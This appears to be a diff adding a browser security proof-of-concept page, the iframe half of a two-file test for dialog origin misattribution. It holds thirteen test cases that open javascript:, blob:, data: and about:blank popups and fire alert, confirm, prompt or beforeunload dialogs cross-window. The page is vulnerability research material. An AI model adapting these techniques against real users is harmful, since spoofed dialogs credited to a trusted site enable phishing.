@@ -1,0 +1,382 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC Frame — Cross-Origin iframe</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #0d0810;
+    --surface: #130f18;
+    --border: #221828;
+    --accent: #ff4d6d;
+    --accent2: #00e5ff;
+    --accent3: #7b61ff;
+    --warn: #ffb347;
+    --text: #c9d1e0;
+    --text-dim: #5a4a60;
+    --text-bright: #eef2ff;
+    --pass: #00e5a0;
+    --fail: #ff4d6d;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;700;800&display=swap');
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 20px;
+    min-height: 100%;
+  }
+
+  .badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(255,77,109,0.1); border: 1px solid rgba(255,77,109,0.25);
+    color: var(--fail); font-size: 10px; font-weight: 700;
+    letter-spacing: 0.12em; text-transform: uppercase;
+    padding: 3px 10px; border-radius: 4px; margin-bottom: 12px;
+  }
+
+  h2 {
+    font-family: var(--sans);
+    font-size: 17px; font-weight: 800; color: var(--text-bright);
+    margin-bottom: 4px;
+  }
+  h2 span { color: var(--fail); }
+
+  .origin-row {
+    display: flex; align-items: center; gap: 8px;
+    margin: 10px 0 16px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 5px; padding: 8px 12px; font-size: 11px;
+  }
+  .origin-row .lbl { color: var(--text-dim); }
+  .origin-row .val { color: var(--fail); font-weight: 700; }
+
+  select {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--text-bright);
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 9px 12px;
+    border-radius: 5px;
+    outline: none;
+    margin-bottom: 12px;
+    cursor: pointer;
+    appearance: none;
+  }
+  select:focus { border-color: rgba(255,77,109,0.4); }
+
+  .run-btn {
+    width: 100%;
+    background: rgba(255,77,109,0.1);
+    border: 1px solid rgba(255,77,109,0.3);
+    color: var(--fail);
+    font-family: var(--mono);
+    font-size: 11px; font-weight: 700;
+    padding: 10px;
+    border-radius: 5px;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    transition: background 0.15s;
+    margin-bottom: 14px;
+  }
+  .run-btn:hover { background: rgba(255,77,109,0.18); }
+
+  .instruction {
+    background: rgba(255,179,71,0.06);
+    border: 1px solid rgba(255,179,71,0.15);
+    border-radius: 5px; padding: 10px 12px;
+    font-size: 11px; color: var(--warn); line-height: 1.6;
+    margin-bottom: 14px;
+  }
+
+  .desc-box {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 5px; padding: 10px 12px;
+    font-size: 11px; color: var(--text); line-height: 1.7;
+    margin-bottom: 14px; min-height: 48px;
+  }
+  .desc-box span { color: var(--accent2); }
+
+  .log-title {
+    font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em;
+    color: var(--text-dim); font-weight: 700; margin-bottom: 6px;
+  }
+  .log {
+    background: #080608;
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 10px 12px;
+    min-height: 80px;
+    max-height: 120px;
+    overflow-y: auto;
+    font-size: 10px;
+    line-height: 1.8;
+  }
+  .log-entry { margin-bottom: 2px; }
+  .log-entry.ok { color: var(--pass); }
+  .log-entry.err { color: var(--fail); }
+  .log-entry.info { color: var(--accent2); }
+
+  .divider { height: 1px; background: var(--border); margin: 14px 0; }
+</style>
+</head>
+<body>
+
+  <div class="badge">FILE 2 of 2 · Run on localhost:8081</div>
+  <h2>PoC Frame — <span>Cross-Origin iframe</span></h2>
+
+  <div class="origin-row">
+    <span class="lbl">This iframe's origin:</span>
+    <span class="val" id="frame-origin">loading...</span>
+  </div>
+
+  <div class="instruction">
+    ⚑ Click the button below to run the selected test case. A click (user gesture) is required for <code>window.open()</code> to work.
+  </div>
+
+  <!-- Test case selector -->
+  <select id="tc-select" onchange="updateDesc()">
+    <option value="tc01">TC01 · javascript: URL → popup window</option>
+    <option value="tc02">TC02 · javascript: URL → new tab</option>
+    <option value="tc03">TC03 · data:,Hello + win.alert() after 100ms</option>
+    <option value="tc04">TC04 · test: custom protocol + win.alert()</option>
+    <option value="tc05">TC05 · blob: URL opened from iframe</option>
+    <option value="tc06">TC06 · about:blank#hash fragment</option>
+    <option value="tc07">TC07 · window.open('') empty string</option>
+    <option value="tc08a">TC08a · confirm() dialog type</option>
+    <option value="tc08b">TC08b · prompt() dialog type</option>
+    <option value="tc08c">TC08c · beforeunload dialog type</option>
+    <option value="tc10">TC10 · Immediate alert (no setTimeout)</option>
+    <option value="tc11">TC11 · Multi-navigation before alert</option>
+    <option value="tc12">TC12 · javascript:void(0) + win.alert()</option>
+  </select>
+
+  <!-- Description of selected test -->
+  <div class="desc-box" id="desc-box">Select a test case above to see its description.</div>
+
+  <!-- Run button -->
+  <button class="run-btn" id="run-btn" onclick="runSelected()">▶ Click here to run test (user gesture required)</button>
+
+  <div class="divider"></div>
+
+  <!-- What to check -->
+  <div class="log-title">What to check in the dialog</div>
+  <div class="desc-box" style="margin-bottom:10px;">
+    Look at the <span>dialog title bar</span>.<br>
+    ❌ <strong style="color:#ff4d6d">VULNERABLE</strong> → title says <code style="color:#ffb347">localhost:8080 says</code> (top frame — wrong)<br>
+    ✅ <strong style="color:#00e5a0">SAFE</strong> → title says <code style="color:#00e5a0">An embedded page at localhost:8081 says</code>
+  </div>
+
+  <!-- Activity log -->
+  <div class="log-title">Activity Log</div>
+  <div class="log" id="log"></div>
+
+<script>
+  const W = 'width=800,height=400,top=80,left=100';
+  const myOrigin = window.location.origin;
+  document.getElementById('frame-origin').textContent = myOrigin;
+
+  const descriptions = {
+    tc01: 'Opens a popup using a <javascript:> URL. The alert() runs immediately inside the new window. Checks if dialog title shows this iframe\'s origin or the top frame\'s origin.',
+    tc02: 'Same as TC01 but opens in a new browser tab (no window features string). Tests whether tab vs popup changes origin attribution.',
+    tc03: 'Opens data:,Hello in a popup, then calls win.alert() from this iframe after 100ms. The dialog is invoked cross-window — tests who gets credited as the initiator.',
+    tc04: 'Opens an unknown protocol (test:) which shows an error page. Then calls win.alert() cross-window. Tests origin on error/unhandled-protocol pages.',
+    tc05: 'Creates a Blob URL owned by this iframe\'s origin, opens it in a popup. The blob page runs alert(). Blob origin is well-defined (creator\'s origin), so misattribution is very clear.',
+    tc06: 'Opens about:blank#hash — NOT pure about:blank. Tests whether the hash fragment bypasses the safe code path that correctly shows iframe origin for plain about:blank.',
+    tc07: 'Calls window.open(\'\') with an empty string. Browser may treat it as about:blank but may use a different NavigationEntry path. Tests origin attribution on empty-URL windows.',
+    tc08a: 'Uses confirm() instead of alert(). Each dialog type may have an independent origin-attribution code path — a fix for alert() might not cover confirm().',
+    tc08b: 'Uses prompt() instead of alert(). Tests whether the prompt dialog type has consistent origin attribution with alert().',
+    tc08c: 'Sets win.onbeforeunload, then navigates the window away. The beforeunload dialog fires on navigation — tests a completely separate code path from alert/confirm/prompt.',
+    tc10: 'Calls win.alert() synchronously with NO setTimeout. The window\'s NavigationEntry may not be committed yet — tests the race condition at its worst point.',
+    tc11: 'Opens data:,First, waits, navigates to data:,Second, waits, then calls alert(). A second navigation creates a new NavigationEntry — tests whether the fix handles subsequent navigations correctly.',
+    tc12: 'Opens javascript:void(0) (no inline dialog), then calls win.alert() cross-window after 200ms. Tests two-step invocation vs. inline dialog-in-URL.',
+  };
+
+  function updateDesc() {
+    const tc = document.getElementById('tc-select').value;
+    document.getElementById('desc-box').textContent = descriptions[tc] || '';
+  }
+  updateDesc();
+
+  function log(msg, type='info') {
+    const el = document.createElement('div');
+    el.className = 'log-entry ' + type;
+    el.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    const logEl = document.getElementById('log');
+    logEl.appendChild(el);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function runSelected() {
+    const tc = document.getElementById('tc-select').value;
+    log('Running ' + tc.toUpperCase() + ' ...', 'info');
+
+    try {
+      switch(tc) {
+
+        case 'tc01':
+          // javascript: URL — alert runs inside new popup immediately
+          window.open(
+            'javascript:alert("TC01 — doc.domain: " + document.domain + " | win.origin: " + window.origin)',
+            '_blank', W
+          );
+          log('TC01: Popup opened with javascript: URL. Check dialog title.', 'ok');
+          break;
+
+        case 'tc02':
+          // Same but new tab (no window features)
+          window.open(
+            'javascript:alert("TC02 tab — doc.domain: " + document.domain + " | win.origin: " + window.origin)'
+          );
+          log('TC02: New tab opened with javascript: URL. Check dialog title.', 'ok');
+          break;
+
+        case 'tc03': {
+          // data:,Hello then cross-window alert after 100ms
+          const w3 = window.open('data:,Hello', '_blank', W);
+          setTimeout(() => {
+            w3.alert('TC03 — Cross-window alert from iframe.\niframe origin: ' + myOrigin);
+            log('TC03: win.alert() called after 100ms. Check dialog title.', 'ok');
+          }, 100);
+          log('TC03: data:,Hello popup opened. Waiting 100ms...', 'info');
+          break;
+        }
+
+        case 'tc04': {
+          // Custom protocol — error page, then cross-window alert
+          const w4 = window.open('test:', '_blank', W);
+          setTimeout(() => {
+            try {
+              w4.alert('TC04 — Custom protocol window.\niframe origin: ' + myOrigin);
+              log('TC04: win.alert() called on test: window. Check dialog title.', 'ok');
+            } catch(e) {
+              log('TC04: Error calling win.alert() — ' + e.message, 'err');
+            }
+          }, 100);
+          log('TC04: test: popup opened. Waiting 100ms...', 'info');
+          break;
+        }
+
+        case 'tc05': {
+          // Blob URL owned by iframe origin
+          const html = '<script>alert("TC05 blob — win.origin: " + window.origin + " | doc.domain: " + document.domain);<\/script>';
+          const blob = new Blob([html], { type: 'text/html' });
+          const blobUrl = URL.createObjectURL(blob);
+          window.open(blobUrl, '_blank', W);
+          log('TC05: Blob URL popup opened. Check dialog title (blob origin = this iframe\'s origin).', 'ok');
+          break;
+        }
+
+        case 'tc06': {
+          // about:blank#hash — near-blank with fragment
+          const w6 = window.open('about:blank#testfragment', '_blank', W);
+          setTimeout(() => {
+            w6.alert('TC06 — about:blank#hash window.\niframe origin: ' + myOrigin);
+            log('TC06: win.alert() on about:blank#hash. Check if same behavior as pure about:blank.', 'ok');
+          }, 100);
+          log('TC06: about:blank#hash popup opened. Waiting 100ms...', 'info');
+          break;
+        }
+
+        case 'tc07': {
+          // Empty string URL
+          const w7 = window.open('', '_blank', W);
+          setTimeout(() => {
+            w7.alert('TC07 — Empty string window.open(\'\').\niframe origin: ' + myOrigin);
+            log('TC07: win.alert() on empty-URL window. Check dialog title.', 'ok');
+          }, 100);
+          log('TC07: window.open(\'\') popup opened. Waiting 100ms...', 'info');
+          break;
+        }
+
+        case 'tc08a': {
+          // confirm() dialog type
+          const w8a = window.open('data:,Hello', '_blank', W);
+          setTimeout(() => {
+            w8a.confirm('TC08a — confirm() dialog.\niframe origin: ' + myOrigin);
+            log('TC08a: win.confirm() called. Check dialog title.', 'ok');
+          }, 100);
+          break;
+        }
+
+        case 'tc08b': {
+          // prompt() dialog type
+          const w8b = window.open('data:,Hello', '_blank', W);
+          setTimeout(() => {
+            w8b.prompt('TC08b — prompt() dialog.\niframe origin: ' + myOrigin, '');
+            log('TC08b: win.prompt() called. Check dialog title.', 'ok');
+          }, 100);
+          break;
+        }
+
+        case 'tc08c': {
+          // beforeunload dialog
+          const w8c = window.open('data:,Hello', '_blank', W);
+          setTimeout(() => {
+            w8c.onbeforeunload = () => 'TC08c — beforeunload dialog. Check title bar for origin.';
+            setTimeout(() => {
+              w8c.location.href = 'about:blank'; // triggers beforeunload
+              log('TC08c: Navigating window to trigger beforeunload dialog. Check dialog title.', 'ok');
+            }, 400);
+            log('TC08c: beforeunload handler set. Navigating in 400ms...', 'info');
+          }, 100);
+          break;
+        }
+
+        case 'tc10': {
+          // Immediate — no setTimeout, before NavigationEntry commits
+          const w10 = window.open('data:,Hello', '_blank', W);
+          try {
+            w10.alert('TC10 — IMMEDIATE alert (no setTimeout).\niframe origin: ' + myOrigin);
+            log('TC10: Immediate win.alert() succeeded. Check dialog title.', 'ok');
+          } catch(e) {
+            log('TC10: Error on immediate call (expected possible block) — ' + e.message, 'err');
+          }
+          break;
+        }
+
+        case 'tc11': {
+          // Multi-navigation — two navs before alert
+          const w11 = window.open('data:,First', '_blank', W);
+          log('TC11: First window opened (data:,First). Waiting 300ms...', 'info');
+          setTimeout(() => {
+            w11.location.href = 'data:,Second'; // second navigation
+            log('TC11: Second nav to data:,Second. Waiting 300ms more...', 'info');
+            setTimeout(() => {
+              w11.alert('TC11 — After 2 navigations.\niframe origin: ' + myOrigin);
+              log('TC11: win.alert() after second nav. Check dialog title.', 'ok');
+            }, 300);
+          }, 300);
+          break;
+        }
+
+        case 'tc12': {
+          // javascript:void(0) — no inline dialog, then cross-window call
+          const w12 = window.open('javascript:void(0)', '_blank', W);
+          setTimeout(() => {
+            w12.alert('TC12 — javascript:void(0) window, called via win.alert().\niframe origin: ' + myOrigin);
+            log('TC12: win.alert() on void(0) window. Check dialog title.', 'ok');
+          }, 200);
+          log('TC12: javascript:void(0) popup opened. Waiting 200ms...', 'info');
+          break;
+        }
+
+        default:
+          log('Unknown test case selected.', 'err');
+      }
+    } catch(e) {
+      log('Uncaught error: ' + e.message, 'err');
+    }
+  }
+</script>
+</body>
+</html>
